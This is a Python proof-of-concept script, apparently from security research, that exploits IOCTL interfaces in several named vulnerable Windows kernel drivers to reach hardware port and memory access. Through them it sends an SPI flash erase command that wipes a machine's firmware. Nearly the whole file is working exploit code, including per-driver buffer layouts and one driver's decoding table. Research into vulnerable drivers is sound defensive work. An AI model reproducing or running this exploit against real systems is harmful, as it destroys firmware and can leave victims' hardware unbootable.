'''
  rwf.py - firmware erasing PoC by exploiting vulnerable kernel drivers
  Tested on Windows 10 Enterprise LTSC (OS Build 17763.4131) & Apollo Lake SoC (UP2)

  Takahiro Haruyama (@cci_forensics)
'''
#!/usr/bin/env python3

import argparse, os, sys, struct, time
import  hexdump
from abc import ABCMeta, abstractmethod

from ctypes import *
from ctypes.wintypes import *


# Print/debug functions

ENABLE_PROCESSED_OUTPUT = 0x0001
ENABLE_WRAP_AT_EOL_OUTPUT = 0x0002
ENABLE_VIRTUAL_TERMINAL_PROCESSING = 0x0004
MODE = ENABLE_PROCESSED_OUTPUT + ENABLE_WRAP_AT_EOL_OUTPUT + ENABLE_VIRTUAL_TERMINAL_PROCESSING
kernel32 = windll.kernel32
handle = kernel32.GetStdHandle(-11)
kernel32.SetConsoleMode(handle, MODE)

g_debug = False

def info(msg):
    print("\033[34m\033[1m[*]\033[0m {}".format(msg))

def success(msg):
    print("\033[32m\033[1m[+]\033[0m {}".format(msg))
    
def error(msg):
    print("\033[31m\033[1m[!]\033[0m {}".format(msg))

def debug(msg):
    if g_debug:
        print("\033[33m\033[1m[D]\033[0m {}".format(msg))
        OutputDebugStringA(msg.encode() + b"\n")

def debug_bin(n, v):
    #debug('{}: {} ({} bytes)'.format(n, space_hex(v), len(v)))
    if g_debug:
        debug(n)
        hexdump.hexdump(v)


# ctypes errcheck functions

gle = windll.kernel32.GetLastError

def errcheck_bool(res, func, args):
    le = gle()
    if not res and le != 0x1f: 
        raise Exception("{} failed. GLE: {}".format(func.__name__, le))
    return res

def errcheck_drivername(res, func, args):
    if res == 0:
        raise Exception("{} failed. GLE: {}".format(func.__name__, gle()))
    if res == args[2]:
        raise Exception("{} failed. Buffer too short. GLE: {}".format(func.__name__, gle()))
    return res

def errcheck_createfile(res, func, args):
    if res == HANDLE(-1).value:  # INVALID_HANDLE_VALUE
        raise Exception("Failed to open device {}. GLE: {}".format(args[0], gle()))
    return res

def errcheck_virtualalloc(res, func, args):
    if res is None:
        raise Exception("Failed to allocate memory at {:#x}. GLE: {}".format(args[0], gle()))
    return res


# Windows API definitions

GetProcAddress = windll.kernel32.GetProcAddress
GetProcAddress.restype = LPVOID
GetProcAddress.argtypes = [LPVOID, LPCSTR]

LoadLibraryA = windll.kernel32.LoadLibraryA
LoadLibraryA.restype = LPVOID
LoadLibraryA.argtypes = [LPCSTR]

CreateFileA = windll.kernel32.CreateFileA
CreateFileA.restype = HANDLE
# we won't use LPSECURITY_ATTRIBUTES (arg 4) so just use LPVOID
CreateFileA.argtypes = [LPCSTR, DWORD, DWORD, LPVOID, DWORD, DWORD, HANDLE]
CreateFileA.errcheck = errcheck_createfile
# constants for CreateFileA
GENERIC_READ = (1 << 30)
GENERIC_WRITE = (1 << 31)
FILE_SHARE_READ = 1
FILE_SHARE_WRITE = 2
OPEN_EXISTING = 3
FILE_ATTRIBUTE_NORMAL = 0x80

DeviceIoControl = windll.kernel32.DeviceIoControl
DeviceIoControl.restype = BOOL
# we won't use LPOVERLAPPED (arg 8) so just use LPVOID
DeviceIoControl.argtypes = [HANDLE, DWORD, LPVOID, DWORD, LPVOID, DWORD,
                            POINTER(DWORD), LPVOID]
DeviceIoControl.errcheck = errcheck_bool

OutputDebugStringA = windll.kernel32.OutputDebugStringA
OutputDebugStringA.argtypes = [LPCSTR]
OutputDebugStringA.restype = None # for void

EnumDeviceDrivers = windll.psapi.EnumDeviceDrivers
EnumDeviceDrivers.restype = BOOL
EnumDeviceDrivers.argtypes = [LPVOID, DWORD, POINTER(DWORD)]
EnumDeviceDrivers.errcheck = errcheck_bool

GetDeviceDriverBaseNameA = windll.psapi.GetDeviceDriverBaseNameA
GetDeviceDriverBaseNameA.restype = DWORD
GetDeviceDriverBaseNameA.argtypes = [LPVOID, LPCSTR, DWORD]
GetDeviceDriverBaseNameA.errcheck = errcheck_drivername

CreateEventA = windll.kernel32.CreateEventA
CreateEventA.restype = HANDLE
CreateEventA.argtypes = [LPVOID, BOOL, BOOL, LPCSTR] # use NULL for LPSECURITY_ATTRIBUTES

CloseHandle = windll.kernel32.CloseHandle
CloseHandle.restype = BOOL
CloseHandle.argtypes = [HANDLE]

SIZE_T = c_size_t
VirtualAlloc = windll.kernel32.VirtualAlloc
VirtualAlloc.restype = LPVOID
VirtualAlloc.argtypes = [LPVOID, SIZE_T, DWORD, DWORD]
VirtualAlloc.errcheck = errcheck_virtualalloc
MEM_COMMIT = 0x00001000
MEM_RESERVE = 0x00002000
PAGE_EXECUTE_READWRITE = 0x00000040


# PCI Configuration for SPIBAR 

PORT_PCI_CFG_ADDR = 0xCF8
PORT_PCI_CFG_DATA = 0xCFC
BAD_VALUE = 0xdeadbeef


# Hardware specific definitions (UP2, Apollo Lake SoC)
# PCI configuration for SPIBAR
APL_PCI_B = 0
APL_PCI_D = 0xD
APL_PCI_F = 2
APL_PCI_O = 0x10
g_pci_addr = (0x80000000 | (APL_PCI_B << 16) | (APL_PCI_D << 11) | (APL_PCI_F << 8) | (APL_PCI_O & ~3)) & 0xffffffff
g_port_pci_cfg_data = (PORT_PCI_CFG_DATA + ( APL_PCI_O & 0x3 )) & 0xffff
# SPI registers (HW sequencing)
OFF_HSFS = 4
OFF_FADDR = 8
HSFS_BIT_FDONE = 0
HSFS_BIT_FCERR = 1
HSFS_BIT_AEL = 2
HSFS_BIT_SCIP = 5
HSFS_BIT_FGO = 16
HSFS_BIT_FCYCLE = 17
SPI_FCYCLE_ERASE = 3 # 4 bits, not a bit
HSFS_BIT_FDBC = 24
V_FDONE = 1 << HSFS_BIT_FDONE
V_FCERR = 1 << HSFS_BIT_FCERR
V_AEL = 1 << HSFS_BIT_AEL
V_SCIP = 1 << HSFS_BIT_SCIP
V_FGO = 1 << HSFS_BIT_FGO
V_FCYCLE_ERASE = SPI_FCYCLE_ERASE << HSFS_BIT_FCYCLE


# Device class

class VulDrv(metaclass=ABCMeta):

    DEV_NAME = None
    IOCTL_MMIO_READ = None
    IOCTL_MMIO_WRITE = None
    IOCTL_PIO_IN = None
    IOCTL_PIO_OUT = None

    def __init__(self):
        
        self.hdev = None

    def get_device_handle(self):

        info("Getting device handle: {}".format(self.DEV_NAME))
        self.hdev = CreateFileA(self.DEV_NAME, GENERIC_READ | GENERIC_WRITE,
                                FILE_SHARE_READ | FILE_SHARE_WRITE, None, OPEN_EXISTING,
                                FILE_ATTRIBUTE_NORMAL, None)

    @abstractmethod
    def pio_dword(self, ioctl_code, port, data_value=None):
        raise NotImplementedError()

    @abstractmethod
    def mmio_dword(self, ioctl_code, paddr, data_value=None):
        raise NotImplementedError()

    def get_spi_base(self):

        ret = self.pio_dword(self.IOCTL_PIO_OUT, PORT_PCI_CFG_ADDR, data_value=g_pci_addr)
        debug('OUT port {:#x} = {:#x}'.format(PORT_PCI_CFG_ADDR, ret))

        ret = self.pio_dword(self.IOCTL_PIO_IN, g_port_pci_cfg_data)
        debug('IN port {:#x} = {:#x}'.format(g_port_pci_cfg_data, ret))

        return ret

    def erase_bios(self, bar):

        hsfs = self.mmio_dword(self.IOCTL_MMIO_READ, bar + OFF_HSFS)
        debug('HSFS (before)     = {:#010x}, {:#b}'.format(hsfs, hsfs))
        if hsfs == BAD_VALUE:
            error('MMIO read failed. Erase command aborted')
            return

        # Clear FDONE/FCERR/AEL bits
        hsfs = hsfs | V_FDONE | V_FCERR | V_AEL
        self.mmio_dword(self.IOCTL_MMIO_WRITE, bar + OFF_HSFS, data_value=hsfs)
        hsfs = self.mmio_dword(self.IOCTL_MMIO_READ, bar + OFF_HSFS)
        debug('HSFS (cleared)    = {:#010x}, {:#b}'.format(hsfs, hsfs))

        # Set FADDR
        self.mmio_dword(self.IOCTL_MMIO_WRITE, bar + OFF_FADDR, data_value=0)
        faddr = self.mmio_dword(self.IOCTL_MMIO_READ, bar + OFF_FADDR)
        debug('FADDR (set)       = {:#010x}'.format(faddr))
        
        # Clear the FDBC -> no need for erase
        #hsfs = hsfs & (~(0b111111 << HSFS_BIT_FDBC) & 0xffffffff)
        # Set the SPI erase command and FGO
        hsfs = hsfs | V_FCYCLE_ERASE | V_FGO
        debug('HSFS (writing)    = {:#010x}, {:#b}'.format(hsfs, hsfs))
        self.mmio_dword(self.IOCTL_MMIO_WRITE, bar + OFF_HSFS, data_value=hsfs)

        time.sleep(0.1)
        hsfs = self.mmio_dword(self.IOCTL_MMIO_READ, bar + OFF_HSFS)
        debug('HSFS (after)      = {:#010x}, {:#b}'.format(hsfs, hsfs))
        #if (hsfs & V_FDONE) and not (hsfs & V_SCIP) and not (hsfs & V_FCERR):
        if (hsfs & V_FDONE) and not (hsfs & V_SCIP):
            success('Firmware erased')

    def erase_bios_DMA(self, bar):

        ptr_spi_regs = self.mmio_dword(self.IOCTL_MMIO_READ, bar)
        debug('SPI registers are mapped at {:#010x}'.format(ptr_spi_regs))
        if ptr_spi_regs == bar:
            error('Getting a DMA ptr failed. Erase command aborted')
            return

        hsfs = DWORD(BAD_VALUE)
        memmove(byref(hsfs), ptr_spi_regs + OFF_HSFS, 4)
        debug('HSFS (before)     = {:#010x}, {:#b}'.format(hsfs.value, hsfs.value))
        if hsfs.value == BAD_VALUE:
            error('MMIO read failed. Erase command aborted')
            return

        # Clear FDONE/FCERR/AEL bits
        hsfs.value = hsfs.value | V_FDONE | V_FCERR | V_AEL
        memmove(ptr_spi_regs + OFF_HSFS, byref(hsfs), 4)
        memmove(byref(hsfs), ptr_spi_regs + OFF_HSFS, 4)
        debug('HSFS (cleared)    = {:#010x}, {:#b}'.format(hsfs.value, hsfs.value))

        # Set FADDR
        faddr = DWORD(0)
        memmove(ptr_spi_regs + OFF_FADDR, byref(faddr), 4)
        memmove(byref(faddr), ptr_spi_regs + OFF_FADDR, 4)
        debug('FADDR (set)       = {:#010x}'.format(faddr.value))
        
        hsfs.value = hsfs.value | V_FCYCLE_ERASE | V_FGO
        debug('HSFS (writing)    = {:#010x}, {:#b}'.format(hsfs.value, hsfs.value))
        memmove(ptr_spi_regs + OFF_HSFS, byref(hsfs), 4)

        time.sleep(0.1)
        memmove(byref(hsfs), ptr_spi_regs + OFF_HSFS, 4)
        debug('HSFS (after)      = {:#010x}, {:#b}'.format(hsfs.value, hsfs.value))
        #if (hsfs & V_FDONE) and not (hsfs & V_SCIP) and not (hsfs & V_FCERR):
        if (hsfs.value & V_FDONE) and not (hsfs.value & V_SCIP):
            success('Firmware erased')
            
class AMD(VulDrv): # PDFWKRNL.sys

    DEV_NAME = br'\\.\PdFwKrnl'
    IOCTL_MMIO_READ = 0x80002000
    IOCTL_MMIO_WRITE = 0x80002004
    IOCTL_PIO_IN = 0x80002008
    IOCTL_PIO_OUT = 0x8000200C

    class BufAmdPIO(LittleEndianStructure):

        _fields_ = [('port', DWORD), ('code', DWORD), ('data', DWORD)] # code = 4

    class BufAmdMMIO(LittleEndianStructure):

        _fields_ = [('paddr_then_ret', ULARGE_INTEGER), ('size', DWORD), ('data_to_write', DWORD)] # size = 4
    

    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf = self.BufAmdPIO(DWORD(port), DWORD(4), data)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.data        

    def mmio_dword(self, ioctl_code, paddr, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf = self.BufAmdMMIO(ULARGE_INTEGER(paddr), DWORD(4), data)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.paddr_then_ret

class BufPhxHead(LittleEndianStructure): # because we can't refer to this from inner classes

    _fields_ = [
        ('code', ULARGE_INTEGER), # like ioctl_code for switch
        ('buf_size', ULARGE_INTEGER),
        ('check1', ULARGE_INTEGER), # 0x42AF3C46C89E7221
        ('check2', ULARGE_INTEGER)  # 0x338D098155A1B785
    ]

class PHX(VulDrv): # TdkLib64.sys

    DEV_NAME = br'\\.\TdkLib'
    IOCTL_MMIO_READ = 0x2221D8
    IOCTL_MMIO_WRITE = 0x2221D8
    IOCTL_PIO_IN = 0x2221D8
    IOCTL_PIO_OUT = 0x2221D8
    
    # code in buf for each operation
    BUF_MMIO_READ = 0x30000
    BUF_MMIO_WRITE = 0x30100
    BUF_PIO_IN = 0x30700
    BUF_PIO_OUT = 0x31000

    # used to encode/decode buf
    CHECK1 = 0x42AF3C46C89E7221
    CHECK2 = 0x338D098155A1B785
    BMAP_TABLE = b'\xd5\xa8}\xebKl\xd67\x91`\x88"y?\x84\x10\xd7h)z\xe8a\x92\x1a\xd8i\xe96v\xdc\t\x85.\xeax\xd9O\x93\x14\x96N\x861j\ru\xd45\x87\x1f\xa9b\xab2\x94\x04\xaa>\xd3w\x17\x95\xe7M\x9b,\xd2k\xda\x0c\x97c\xac\'\x9cE\xc7\x11\xdbd\xd1#\xadB\x98\x02\xb4_\xae\xee-\xb5L\xc6\x13\xb7A\xc5\x19\xc9^\xc4(\xc8F\x99\x07\x9d3\xdd{\xed \xb6@\x9a\xec\x0e\xc3P\xb8$\xf0p\xe6G\xd0\x00\xbf8\xef|\x16\x9eR\xc2*\xb9Q\xbe\x06\xc1[\xcfn\xde=\x9f\x1c\xe5o\xdf4\x8c\x01\xa7Z\xa2!\xc0W\x8b\x0b\xbaS\xa0\x1d\xa5\xff\\\xb29\x8a\x03\xbd\xcdD\xfe\xa1%\xb3<\xa6\x12\xb1\xce]\xf5\x81+\xe4g\xf3\x08\xbbH\xf4m\x1e\xe3f\xf2I\x89\xfd\x05\xafY\x90&\x80\xf1T\xa4\x15\xbcX\xfct\xcc0\xfb\x7fJ\x8e\n\x8f;\xfar\xcb\x18\xa3U\xf9\x83/~\xf8\x0f\x8dC\xe2q\xf7\x1b\xe0e:\xf6\x82V\xe1s\xb0\xca\x7f\x9aU\xad7\xcd\x8cj\xc1\x1e\xe1\xa2E,u\xef\x0fM\xb7^&\xd6\x84<\xe7b\x17\xf5\x94\xa6\xc61p\x9e\x0bQy\xb3\xd1If\x12\x88\xbdAZ \xec\xdc*5l\x98/\x1b\x07\x81\xab\xf8\xe3\xb5\x929\rr`S\xf1\xb0Kh}\xc3\xca\xdf\x04\\?($w\x8a\x86\xa4\xd4\xe9\xfb\xa0\xd8\xcf\x9c\x8e\xa9\xbadW\t\x153GO\xf7\xc8\xbf\x11\x19+C\x05\xc5\x90\x96{\xf3\xe5\xfd\xda-\x1c;"\x0c\x13n\x83\x02\xed\xde\xd2\xbc\xfa\xeb\x0e\x1f)0\n\xcb\xac\xa1\x99\xf0\xe0\xe2\xd0\x08\x16%6=\'FTis@Jk\x85\x93\xa5\xb2\x9d\xe8\xd5\xa7\xb6\x9b\x01284HRX\xce\xfe\xb8\xaa\xb4V[q_x\x89\xa3\xc2\xd7\xae\x8b\x80\x9f\x8d\x87vea]Lgc\xff\xe6\xdb\xaf\xb9\x8f~PB:.\x00\x06\x10\x18#DN\x1dm\x91\x97\xf6\xfc\xf2\xc7\xbe\x95|>\x14\x1a!\x03toY\x82z\xd3\xc9\xc0\xc4\xbb\xf9\xf4\xee\xea\xe4\xdd\xd9\xcc\xb1\xa8TDK1\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00'
    BMAP_TABLE_ENC = BMAP_TABLE[:0x100]
    BMAP_TABLE_DEC = BMAP_TABLE[0x100:0x200]
    '''
    class BufPhxHead(LittleEndianStructure):

        _fields_ = [
            ('code', ULARGE_INTEGER), # like ioctl_code for switch
            ('any', ULARGE_INTEGER),
            ('check1', ULARGE_INTEGER), # 0x42AF3C46C89E7221
            ('check2', ULARGE_INTEGER)  # 0x338D098155A1B785
        ]
    '''
    class BufPhxPIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('head', BufPhxHead), ('port', WORD), ('data', DWORD)]

    class BufPhxMMIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('head', BufPhxHead), ('paddr', ULARGE_INTEGER), ('data_size', ULARGE_INTEGER), ('data', DWORD)]

    def encode(self, buf):

        enc = bytes([self.BMAP_TABLE_ENC[b] for b in buf])
        return enc[::-1]

    def decode(self, buf):

        dec = bytes([self.BMAP_TABLE_DEC[b] for b in buf])
        return dec[::-1]

    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        code = ULARGE_INTEGER(self.BUF_PIO_OUT) if data_value is not None else ULARGE_INTEGER(self.BUF_PIO_IN)
        buf_size = ULARGE_INTEGER(sizeof(self.BufPhxPIO))
        #head = self.BufPhxHead(code, ULARGE_INTEGER(0), ULARGE_INTEGER(self.CHECK1), ULARGE_INTEGER(self.CHECK2))
        #head = BufPhxHead(code, ULARGE_INTEGER(0), ULARGE_INTEGER(self.CHECK1), ULARGE_INTEGER(self.CHECK2))
        head = BufPhxHead(code, buf_size, ULARGE_INTEGER(self.CHECK1), ULARGE_INTEGER(self.CHECK2))
        buf = self.BufPhxPIO(head, WORD(port), data)
        ebuf = self.encode(bytes(buf))
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, ebuf, len(ebuf), ebuf, len(ebuf),
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}, {:#x}): bytes_returned = {:#x}'.format(ioctl_code, code.value, bytes_returned.value))

        return self.BufPhxPIO.from_buffer_copy(self.decode(ebuf)).data

    def mmio_dword(self, ioctl_code, paddr, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        code = ULARGE_INTEGER(self.BUF_MMIO_WRITE) if data_value is not None else ULARGE_INTEGER(self.BUF_MMIO_READ)
        buf_size = ULARGE_INTEGER(sizeof(self.BufPhxMMIO))
        #head = self.BufPhxHead(code, ULARGE_INTEGER(0), ULARGE_INTEGER(self.CHECK1), ULARGE_INTEGER(self.CHECK2))
        head = BufPhxHead(code, buf_size, ULARGE_INTEGER(self.CHECK1), ULARGE_INTEGER(self.CHECK2))
        buf = self.BufPhxMMIO(head, ULARGE_INTEGER(paddr), ULARGE_INTEGER(4), data)
        ebuf = self.encode(bytes(buf))        
        bytes_returned = c_ulong()
        
        DeviceIoControl(self.hdev, ioctl_code, ebuf, len(ebuf), ebuf, len(ebuf),
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}, {:#x}): bytes_returned = {:#x}'.format(ioctl_code, code.value, bytes_returned.value))

        return self.BufPhxMMIO.from_buffer_copy(self.decode(ebuf)).data

class CPUID(VulDrv): # only device access

    DEV_NAME = br'\\.\cpuz153'
    IOCTL_MMIO_READ = 0x9C402544 # or 0x9C402540
    IOCTL_MMIO_WRITE = 0x9C402560 
    IOCTL_PIO_IN = 0x9C402488
    IOCTL_PIO_OUT = 0x9C4024C8

    def pio_dword(self, ioctl_code, port, data_value=None):
        raise NotImplementedError()

    def mmio_dword(self, ioctl_code, paddr, data_value=None):
        raise NotImplementedError()

class DELL(VulDrv): # only device access

    DEV_NAME = br'\\.\__WDT__'
    IOCTL_MMIO_READ = 0x9C402544 # or 0x9C402540
    IOCTL_MMIO_WRITE = 0x9C402560 
    IOCTL_PIO_IN = 0x9C402488
    IOCTL_PIO_OUT = 0x9C4024C8

    def pio_dword(self, ioctl_code, port, data_value=None):
        raise NotImplementedError()

    def mmio_dword(self, ioctl_code, paddr, data_value=None):
        raise NotImplementedError()

class MOY(VulDrv): # phymem_ext64.sys

    DEV_NAME = br'\\.\PhyMem2'
    IOCTL_MMIO_READ = 0x80002000
    IOCTL_MMIO_WRITE = 0x80002000 # same IOCTL because of DMA
    IOCTL_PIO_IN = 0x80002008
    IOCTL_PIO_OUT = 0x8000200C

    class BufMoyPIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('port_then_res', DWORD), ('size', DWORD), ('data_to_write', DWORD)] # size = 4

    class BufMoyMMIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('paddr_then_DMA_ptr', ULARGE_INTEGER), ('size', ULARGE_INTEGER)]

    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf = self.BufMoyPIO(DWORD(port), DWORD(4), data)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), 4,
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.port_then_res

    def mmio_dword(self, ioctl_code, paddr_then_DMA_ptr):

        buf = self.BufMoyMMIO(ULARGE_INTEGER(paddr_then_DMA_ptr), ULARGE_INTEGER(0x100))
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), 8,
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.paddr_then_DMA_ptr

    def erase_bios(self, bar):

        self.erase_bios_DMA(bar)

class RTIF(VulDrv): # rtif.sys

    DEV_NAME = br'\\.\rtif'
    IOCTL_MMIO_READ = 0x80992038
    IOCTL_MMIO_WRITE = 0x80992038
    IOCTL_PIO_IN = 0x80992043
    IOCTL_PIO_OUT = 0x80992043

    class BufRtifPIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('case', DWORD), ('port', DWORD), ('data', DWORD)]

    class BufRtifMMIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('paddr', ULARGE_INTEGER), ('size', DWORD), ('CacheType', DWORD),
                    ('DMA_ptr', ULARGE_INTEGER), ('DMA_ptr_0', ULARGE_INTEGER), ('size_mapped', DWORD)]

    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        case = DWORD(6) if data_value is not None else DWORD(3)
        buf = self.BufRtifPIO(case, DWORD(port), data)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf), 
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.port_then_res

    def mmio_dword(self, ioctl_code, paddr):

        buf = self.BufRtifMMIO(ULARGE_INTEGER(paddr), DWORD(0x1000), DWORD(0),
                               ULARGE_INTEGER(0), ULARGE_INTEGER(0), DWORD(0))
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf), 
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.DMA_ptr

    def erase_bios(self, bar):

        self.erase_bios_DMA(bar)

class INTEL(VulDrv): # stdcdrv64.sys

    DEV_NAME = br'\\.\stdcdrv64'
    IOCTL_MMIO_READ = 0x222408
    IOCTL_MMIO_WRITE = 0x22240C
    IOCTL_PIO_IN = 0x222428
    IOCTL_PIO_OUT = 0x22242C

    class BufIntelPIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('type', BYTE), ('port', WORD), ('data', DWORD)] # type = 2 for dword
    
    class BufIntelMMIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('type', BYTE), ('paddr', ULARGE_INTEGER), ('size', DWORD), ('ptr_src', ULARGE_INTEGER)]
    
    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf_in = self.BufIntelPIO(BYTE(2), WORD(port), data)
        result = DWORD(BAD_VALUE)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf_in), sizeof(buf_in), byref(result), sizeof(DWORD),
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return result.value

    def mmio_dword(self, ioctl_code, paddr, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf_in = self.BufIntelMMIO(BYTE(4), ULARGE_INTEGER(paddr), DWORD(4), ULARGE_INTEGER(addressof(data)))
        result = DWORD(BAD_VALUE)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf_in), sizeof(buf_in), byref(result), sizeof(DWORD),
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return result.value

class NMS(VulDrv): # cg6kwin2k.sys

    DEV_NAME = br'\\.\CG6K'
    IOCTL_MMIO_READ = 0x80012F18
    IOCTL_MMIO_WRITE = 0x80012F1C
    IOCTL_PIO_IN = 0x80012F34
    IOCTL_PIO_OUT = 0x80012EF8

    class BufNMSPIO(LittleEndianStructure):

        _fields_ = [('port_then_res', DWORD), ('data', DWORD)]
    
    class BufNMSMMIO_R(LittleEndianStructure):

        _fields_ = [('paddr_then_res', DWORD), ('size', DWORD)]

    class BufNMSMMIO_W(LittleEndianStructure):

        _fields_ = [('paddr', ULARGE_INTEGER), ('size', DWORD), ('data_to_write', DWORD)]

    def pio_dword(self, ioctl_code, port, data_value=None):

        data = DWORD(data_value) if data_value is not None else DWORD(BAD_VALUE)
        buf = self.BufNMSPIO(DWORD(port), data)
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                        byref(bytes_returned), None)
        debug('pio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.port_then_res

    def mmio_dword(self, ioctl_code, paddr, data_value=None):

        if data_value is not None:
            buf = self.BufNMSMMIO_W(ULARGE_INTEGER(paddr), DWORD(4), DWORD(data_value))
        else:
            buf = self.BufNMSMMIO_R(DWORD(paddr), DWORD(4))
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return None if data_value is not None else buf.paddr_then_res

class INTEL2(VulDrv): # IoAccess.sys

    DEV_NAME = br'\\.\IoAccess'
    IOCTL_MMIO_READ = 0x9C40E080 # get user-mode mapped page
    IOCTL_MMIO_WRITE = 0x9C40E080 
    IOCTL_PCI_READ = 0x9C40E010 # PCI read dword

    class BufINTEL2PCI(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('bus', BYTE), ('device', BYTE), ('function', BYTE), ('field_3', BYTE),
                    ('offset', WORD), ('field_6', WORD), ('result', DWORD)] 

    class BufINTEL2MMIO(LittleEndianStructure):

        _pack_ = 1
        _fields_ = [('pa_then_va', ULARGE_INTEGER), ('size', DWORD), ('pad', DWORD)]
                    
    def pio_dword(self, ioctl_code, port, data_value=None): # not used
        raise NotImplementedError()

    def mmio_dword(self, ioctl_code, paddr, data_value=None):

        buf = self.BufINTEL2MMIO(ULARGE_INTEGER(paddr), DWORD(4), DWORD(0))
        bytes_returned = c_ulong()

        DeviceIoControl(self.hdev, ioctl_code, byref(buf), sizeof(buf), byref(buf), sizeof(buf), 
                        byref(bytes_returned), None)
        debug('mmio_dword ({:#x}): bytes_returned = {:#x}'.format(ioctl_code, bytes_returned.value))

        return buf.pa_then_va

    def get_spi_base(self):

        buf = self.BufINTEL2PCI(BYTE(APL_PCI_B), BYTE(APL_PCI_D), BYTE(APL_PCI_F), BYTE(0),
                                WORD(APL_PCI_O), WORD(0), DWORD(BAD_VALUE))
        bytes_returned = c_ulong()

        # 0x9C40E010 = PCI read dword
        DeviceIoControl(self.hdev, self.IOCTL_PCI_READ, byref(buf), sizeof(buf), byref(buf), sizeof(buf),
                        byref(bytes_returned), None)
        debug('get_spi_base ({:#x}): bytes_returned = {:#x}'.format(self.IOCTL_PCI_READ, bytes_returned.value))

        return buf.result

    def erase_bios(self, bar):

        self.erase_bios_DMA(bar)

# Device class end


g_targets = ['amd', 'phx', 'cpuid', 'moy', 'rtif', 'intel', 'dell', 'nms', 'intel2']

def auto_int(x):
    return int(x, 0)        

def parse_args():
    global g_debug
    
    parser = argparse.ArgumentParser(description='firmware erasing PoC by exploiting vulnerable kernel drivers', formatter_class=argparse.ArgumentDefaultsHelpFormatter)
    parser.add_argument("target", help="target driver ({})".format('/'.join(g_targets)))
    parser.add_argument('-s', '--spibar', type=auto_int, help="specify SPIBAR for buggy IN")
    parser.add_argument("-d", "--debug", action='store_true', help="output debug message")
    
    args = parser.parse_args()    
    g_debug = args.debug
    return args

def main():
    args = parse_args()

    info('start')

    if args.target in g_targets:
        debug('getting the target driver instance..')
        dev = eval(args.target.upper())()
    else:
        error('The driver not found')
        return

    dev.get_device_handle()

    try:
        bar = args.spibar if args.spibar else dev.get_spi_base()
    except NotImplementedError:
        error('The handle is created, but PIO/MMIO are NOT implemented')
        return    
    info('SPIBAR = {:#x}'.format(bar))
    if bar == BAD_VALUE:
        error('Getting SPIBAR failed')
        return

    ch = input('Erasing firmware. OK? (Y/N): ')
    if ch == 'Y':
        dev.erase_bios(bar)
    
    info('done')

if ( __name__ == "__main__" ):
    main()        
        
